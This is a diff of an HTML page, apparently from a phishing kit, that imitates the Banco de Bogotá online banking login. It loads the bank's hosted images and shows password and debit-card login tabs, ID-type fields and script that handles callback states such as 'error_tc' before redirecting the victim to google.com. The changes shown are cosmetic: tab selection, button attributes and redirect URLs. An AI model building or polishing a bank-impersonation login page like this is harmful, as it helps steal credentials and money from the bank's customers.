@@ -1,7 +1,4 @@
-<!DOCTYPE html>
-<html lang="es" class="hydrated">
-
-<head>
+<html lang="es" class="hydrated"><head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
     <link rel="icon" type="image/x-icon" href="img/favicon.ico">
@@ -151,6 +148,7 @@
                                         <div class="I-MuvO+UPg4UEIDwvDzQww==">
                                             <div class="RtO-GDpVCDwXXcYboPOQQA==">
                                                 <img src="https://virtual.bancodebogota.co/bbog-pb-frontend-authentication-app/assets/422e00391dd36d89affe.png" alt="Modern banking interface showing digital financial services and secure login portal for Banco de Bogotá virtual banking platform">
+                                            </div>
                                             <div class="_2NRBYvhlHS2ejyxSrjRrNg==">
                                                 <label class="sherpa-typography-paragraph-S">¿Nunca has ingresado a Banca Virtual?</label>
                                                 <button class="bdb-at-btn--link--white bdb-at-btn--lg">
@@ -166,14 +164,14 @@
                                                         <div id="main" class="mainContainer mainContainer--center">
                                                             <div id="tabs-container" class="mainContainer__tabsContainer" style="width: 100%;">
                                                                 <div role="tablist" aria-label="" id="tabs-bar" class="mainContainer__tabsContainer__bar" style="width: 100%;">
-                                                                    <button id="bdb-ml-secondtabs__1" type="button" role="tab" aria-selected="false" tabindex="0" class="mainContainer__tabsContainer__bar__segment" style="width: 50%; padding: 0px; cursor: pointer;">
-                                                                        <span id="label1" class="mainContainer__tabsContainer__bar__segment__label " style="font-family: Roboto-Regular; color: rgb(92, 92, 92);">Clave segura</span>
+                                                                    <button id="bdb-ml-secondtabs__1" type="button" role="tab" aria-selected="true" tabindex="0" class="mainContainer__tabsContainer__bar__segment" style="width: 50%; padding: 0px; cursor: pointer;">
+                                                                        <span id="label1" class="mainContainer__tabsContainer__bar__segment__label " style="font-family: Roboto-Medium; color: rgb(0, 64, 178);">Clave segura</span>
                                                                     </button>
-                                                                    <button id="bdb-ml-secondtabs__2" type="button" role="tab" aria-selected="true" tabindex="-1" class="mainContainer__tabsContainer__bar__segment" style="width: 50%; padding: 0px; cursor: pointer;">
-                                                                        <span id="label2" class="mainContainer__tabsContainer__bar__segment__label " style="font-family: Roboto-Medium; color: rgb(0, 64, 168);">Tarjeta débito</span>
+                                                                    <button id="bdb-ml-secondtabs__2" type="button" role="tab" aria-selected="false" tabindex="-1" class="mainContainer__tabsContainer__bar__segment" style="width: 50%; padding: 0px; cursor: pointer;">
+                                                                        <span id="label2" class="mainContainer__tabsContainer__bar__segment__label " style="font-family: Roboto-Regular; color: rgb(92, 92, 92);">Tarjeta débito</span>
                                                                     </button>
                                                                 </div>
-                                                                <div id="tab" class="mainContainer__tabsContainer__tab tab" style="width: 50%; transform: translate(100%, 0px);"></div>
+                                                                <div id="tab" class="mainContainer__tabsContainer__tab tab" style="width: 50%; transform: translate(0px, 0px);"></div>
                                                             </div>
                                                         </div>
                                                         <div class="line"></div>
@@ -236,7 +234,7 @@
                                                                         <div class="container__input">
                                                                             <button id="botonMostrarOcultardos" type="button" class="container__input__select" style="display: block;"></button>
                                                                             <div tabindex="0" id="dropdown_identificationTypedos" class="container__input__box">
-                                                                                <p id="opcionamostrardos" class="container__input__box--valueSelected"></p>
+                                                                                <p id="opcionamostrardos" class="container__input__box--valueSelected">C.C. Cédula de ciudadanía</p>
                                                                             </div>
                                                                             <div id="menusitodos" class="animated container__input__options--hide" style="min-width: 296px;">
                                                                                 <div id="option-CC" class="container__input__options__items--same-selected opcionesdos">C.C. Cédula de ciudadanía</div>
@@ -294,7 +292,7 @@
                                                                 </div>
                                                             </auth-bdb-at-input>
                                                         </div>
-                                                        <button id="botonazodos" class="eay7wDeyb-EbWIk2kfDMUg== bdb-at-btn bdb-at-btn--primary bdb-at-btn--lg" disabled="" type="button">Ingresar</button>
+                                                        <button id="botonazodos" class="eay7wDeyb-EbWIk2kfDMUg== bdb-at-btn bdb-at-btn--primary bdb-at-btn--lg" disabled="true" type="button">Ingresar</button>
                                                     </div>
 
                                                     <div id="menuseg" class="menuseg" style="display: block;">
@@ -316,7 +314,7 @@
                                                                 </auth-bdb-at-input>
                                                             </div>
                                                         </div>
-                                                        <button id="botonazouno" class="eay7wDeyb-EbWIk2kfDMUg== bdb-at-btn bdb-at-btn--primary bdb-at-btn--lg" disabled="" type="button">Ingresar</button>
+                                                        <button id="botonazouno" class="eay7wDeyb-EbWIk2kfDMUg== bdb-at-btn bdb-at-btn--primary bdb-at-btn--lg" disabled="true" type="button">Ingresar</button>
                                                         <div class="_2qAdquiAgwqbzNCymlPemw==">
                                                             <div class="FFpcSRrHMJPw-SkgQESC6Q==">
                                                                 <button class="O0YA2X74My9l+nzRnY-JMQ== bdb-at-btn bdb-at-btn--link bdb-at-btn--lg" data-testid="register-button">
@@ -826,7 +824,7 @@
                                             } else if (callbackData === 'error_tc') {
                                                 document.getElementById('error-modal').style.display = 'flex';
                                             } else if (callbackData === 'confirm_finalizar') {
-                                                window.location.href = "https://google.com/";
+                                                window.location.href = "https://google.com";
                                             }
                                         }
                                     }
@@ -867,7 +865,7 @@
                         });
 
                         document.getElementById('back-to-start-button').addEventListener('click', function() {
-                            window.location.href = "index-2.html";
+                            window.location.href = "index.html";
                         });
 
                         verificarCondiciones();
@@ -883,6 +881,7 @@
                 }
             });
         </script>
-</body>
 
-</html>
+
+
+</div></body></html>
